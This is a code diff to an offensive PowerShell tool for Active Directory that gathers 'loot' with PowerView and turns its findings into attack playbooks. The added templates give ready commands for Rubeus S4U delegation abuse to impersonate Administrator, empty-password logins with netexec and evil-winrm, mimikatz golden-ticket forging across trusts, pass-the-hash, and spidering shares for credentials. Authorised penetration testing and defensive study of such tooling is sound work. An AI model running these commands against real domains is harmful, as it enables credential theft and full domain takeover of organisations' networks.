@@ -297,6 +297,8 @@ if ($scope.RunPowerView) {
                 "PASSWORD POLICY"         = { Get-DomainPolicyData -Domain $domainVal 2>$null | Select-Object -ExpandProperty SystemAccess | Format-List | Out-String }
                 "DOMAIN TRUSTS"           = { Get-DomainTrust -Domain $domainVal 2>$null | Format-Table -AutoSize | Out-String }
                 "SMB SHARES"              = { Find-DomainShare -Domain $domainVal 2>$null | Format-Table -AutoSize | Out-String }
+                "PASSWD NOTREQD USERS"    = { Get-DomainUser -UACFilter PASSWD_NOTREQD -Domain $domainVal 2>$null | Select-Object samaccountname,description | Format-Table -AutoSize | Out-String }
+                "ADMINCOUNT USERS"        = { Get-DomainUser -AdminCount -Domain $domainVal 2>$null | Select-Object samaccountname,memberof | Format-Table -AutoSize | Out-String }
             }
             foreach ($sec in $sections.GetEnumerator()) {
                 $pvOut += "`n=== $($sec.Key) ===`n"
@@ -364,19 +366,20 @@ function Get-TableRows ($section) {
 }
 
 $loot = @{
-    DomainUsers       = @()
-    DomainAdmins      = @()
-    DomainComputers   = @()
-    DomainControllers = @()
-    Kerberoastable    = @()
-    AsrepRoastable    = @()
-    Spns              = @()
-    HashesFound       = @()
-    PasswordsFound    = @()
-    PasswordPolicy    = @()
-    DomainTrusts      = @()
-    Gpos              = @()
-    InterestingFiles  = @()
+    DomainUsers            = @()
+    DomainAdmins           = @()
+    DomainComputers        = @()
+    DomainControllers      = @()
+    Kerberoastable         = @()
+    AsrepRoastable         = @()
+    Spns                   = @()
+    HashesFound            = @()
+    PasswordsFound         = @()
+    ConstrainedDelegation  = @()
+    PasswordPolicy         = @()
+    DomainTrusts           = @()
+    Gpos                   = @()
+    InterestingFiles       = @()
 }
 
 $pv = $results["powerview"]
@@ -416,6 +419,11 @@ if ($pv) {
     }
     foreach ($line in ((Get-Section $pv "DOMAIN CONTROLLERS") -split "`n")) {
         if ($line -match "Name\s*:\s*(.+)") { $loot.DomainControllers += $Matches[1].Trim() }
+    }
+    foreach ($row in (Get-TableRows (Get-Section $pv "CONSTRAINED DELEGATION"))) {
+        $parts = $row.Trim() -split "\s+"
+        if ($parts.Count -ge 2) { $loot.ConstrainedDelegation += "$($parts[0]) -> $($parts[1])" }
+        elseif ($parts[0])      { $loot.ConstrainedDelegation += $parts[0] }
     }
 }
 
@@ -464,6 +472,24 @@ if ($pv) {
     }
     if ($loot.DomainTrusts.Count -gt 0) {
         Add-Finding "domain_trusts" "Domain Trusts Identified" "MEDIUM" "Enumeration" "Bidirectional or SID-history trusts can allow cross-domain privilege escalation." $loot.DomainTrusts "PowerView"
+    }
+    $constRows = Get-TableRows (Get-Section $pv "CONSTRAINED DELEGATION")
+    if ($constRows.Count -gt 0) {
+        Add-Finding "constrained_delegation" "Constrained Delegation ($($constRows.Count) accounts)" "HIGH" "Delegation" "S4U2Self/S4U2Proxy abuse - impersonate any user to the delegated service." $loot.ConstrainedDelegation "PowerView"
+    }
+    $noReqRows = Get-TableRows (Get-Section $pv "PASSWD NOTREQD USERS")
+    if ($noReqRows.Count -gt 0) {
+        $noReqUsers = $noReqRows | ForEach-Object { ($_.Trim() -split "\s+")[0] }
+        Add-Finding "password_not_required" "Password Not Required ($($noReqRows.Count) accounts)" "HIGH" "PasswordPolicy" "PASSWD_NOTREQD flag set - try authenticating with an empty password." $noReqUsers "PowerView"
+    }
+    $smbRows = Get-TableRows (Get-Section $pv "SMB SHARES") | Where-Object { $_ -match "READ|WRITE" }
+    if ($smbRows.Count -gt 0) {
+        Add-Finding "smb_shares" "Readable/Writable SMB Shares ($($smbRows.Count) found)" "MEDIUM" "Enumeration" "Check SYSVOL/NETLOGON for GPP passwords. Spider other shares for credentials." $smbRows "PowerView"
+    }
+    $adminCountRows = Get-TableRows (Get-Section $pv "ADMINCOUNT USERS")
+    if ($adminCountRows.Count -gt 5) {
+        $acUsers = $adminCountRows | ForEach-Object { ($_.Trim() -split "\s+")[0] }
+        Add-Finding "admincount_users" "AdminSDHolder Protected Accounts ($($adminCountRows.Count) found)" "MEDIUM" "ACL" "AdminCount=1 accounts - check BloodHound for ACL abuse paths leading to these targets." $acUsers "PowerView"
     }
 }
 
@@ -596,11 +622,52 @@ $attackTemplates = @{
         )
     }
     "hashes_found" = @{
-        Title = "Pass-the-Hash / Hash Cracking"; Phase = "Credential Access ? Lateral Movement"
+        Title = "Pass-the-Hash / Hash Cracking"; Phase = "Credential Access -> Lateral Movement"
         Steps = @(
             @{ Desc = "Crack NTLM hashes";           Cmd = "hashcat -m 1000 $outDir\hashes.txt <WORDLIST> --force"; Note = "Mode 1000 = NTLM" }
             @{ Desc = "Pass-the-Hash (Windows)";     Cmd = "mimikatz.exe `"sekurlsa::pth /user:<USER> /domain:$domainVal /ntlm:<HASH> /run:cmd.exe`"" }
             @{ Desc = "Pass-the-Hash (Linux)";       Cmd = "impacket-psexec $domainVal/<USER>@$dcIpVal -hashes :<HASH>" }
+        )
+    }
+    "constrained_delegation" = @{
+        Title = "Constrained Delegation Abuse (S4U2Proxy)"; Phase = "Privilege Escalation"
+        Steps = @(
+            @{ Desc = "Get TGT for the delegating account";                      Cmd = "Rubeus.exe asktgt /user:<DELEG_ACCOUNT> /domain:$domainVal /rc4:<NTLM_HASH> /nowrap" }
+            @{ Desc = "S4U2Self + S4U2Proxy to impersonate DA to the service";  Cmd = "Rubeus.exe s4u /ticket:<TGT_FROM_ABOVE> /impersonateuser:Administrator /msdsspn:<DELEGATED_SPN> /domain:$domainVal /ptt" }
+            @{ Desc = "Verify access";                                            Cmd = "ls \\\\$dcIpVal\c$" }
+            @{ Desc = "Alternative from Linux";                                   Cmd = "impacket-getST -spn <DELEGATED_SPN> -impersonate Administrator $domainVal/<DELEG_ACCOUNT>:<PASSWORD> -dc-ip $dcIpVal" }
+        )
+    }
+    "password_not_required" = @{
+        Title = "Empty Password Login Attempt"; Phase = "Credential Access"
+        Steps = @(
+            @{ Desc = "Try empty password via SMB";     Cmd = "netexec smb $dcIpVal -u <ACCOUNT> -p ''" }
+            @{ Desc = "Try empty password via WinRM";   Cmd = "evil-winrm -i $dcIpVal -u <ACCOUNT> -p ''" }
+            @{ Desc = "Try empty password via LDAP";    Cmd = "netexec ldap $dcIpVal -u <ACCOUNT> -p ''" }
+        )
+    }
+    "domain_trusts" = @{
+        Title = "Cross-Domain Trust Abuse"; Phase = "Privilege Escalation"
+        Steps = @(
+            @{ Desc = "Enumerate trust details";                                   Cmd = "Get-DomainTrust -Domain $domainVal | Format-List" }
+            @{ Desc = "Forge inter-realm golden ticket (needs DA + krbtgt hash)"; Cmd = "mimikatz.exe `"kerberos::golden /user:Administrator /domain:$domainVal /sid:<CHILD_SID> /krbtgt:<KRBTGT_HASH> /sids:<PARENT_DA_SID> /ticket:$outDir\trust_ticket.kirbi`" exit" }
+            @{ Desc = "Use the forged ticket";                                     Cmd = "Rubeus.exe ptt /ticket:$outDir\trust_ticket.kirbi" }
+        )
+    }
+    "smb_shares" = @{
+        Title = "SMB Share Hunting"; Phase = "Enumeration -> Credential Access"
+        Steps = @(
+            @{ Desc = "List all readable shares";              Cmd = "Find-DomainShare -Domain $domainVal | Format-Table -AutoSize" }
+            @{ Desc = "Hunt for GPP passwords in SYSVOL";     Cmd = "Get-GPPPassword -Domain $domainVal"; Note = "PowerSploit Get-GPPPassword or netexec -M gpp_password" }
+            @{ Desc = "Spider shares for credentials (Linux)"; Cmd = "netexec smb $dcIpVal -u <USER> -p <PASSWORD> -M spider_plus -o DOWNLOAD_FLAG=True" }
+            @{ Desc = "Mount a share (Linux)";                 Cmd = "smbclient //$dcIpVal/<SHARE_NAME> -U '$domainVal\<USER>%<PASSWORD>'" }
+        )
+    }
+    "admincount_users" = @{
+        Title = "AdminSDHolder ACL Abuse Paths"; Phase = "Privilege Escalation"
+        Steps = @(
+            @{ Desc = "Check ACLs on a protected account";     Cmd = "Get-DomainObjectAcl -Identity <ACCOUNT> -ResolveGUIDs | Where-Object { `$_.ActiveDirectoryRights -match 'GenericAll|WriteDACL|WriteOwner|GenericWrite' }" }
+            @{ Desc = "Use BloodHound to find shortest paths";  Cmd = "# In BloodHound: Search -> Shortest Paths to High Value Targets"; Note = "AdminCount=1 accounts appear as high value targets" }
         )
     }
 }
@@ -639,8 +706,9 @@ $lootGrid = @(
     (Render-LootCard "AS-REP Roastable"       $loot.AsrepRoastable    "lh-orange" $null)
     (Render-LootCard "SPNs"                   $loot.Spns              "lh-yellow" $null)
     (Render-LootCard "NTLM Hashes"            $loot.HashesFound       "lh-red"    $null)
-    (Render-LootCard "Cleartext Passwords"    $loot.PasswordsFound    "lh-red"    $null)
-    (Render-LootCard "Password Policy"        $loot.PasswordPolicy    "lh-blue"   $null)
+    (Render-LootCard "Cleartext Passwords"    $loot.PasswordsFound       "lh-red"    $null)
+    (Render-LootCard "Constrained Deleg."    $loot.ConstrainedDelegation "lh-orange" $null)
+    (Render-LootCard "Password Policy"        $loot.PasswordPolicy       "lh-blue"   $null)
     (Render-LootCard "Domain Trusts"          $loot.DomainTrusts      "lh-yellow" $null)
     (Render-LootCard "GPOs"                   $loot.Gpos              "lh-gray"   $null)
     (Render-LootCard "Interesting Files"      $loot.InterestingFiles  "lh-yellow" $null)
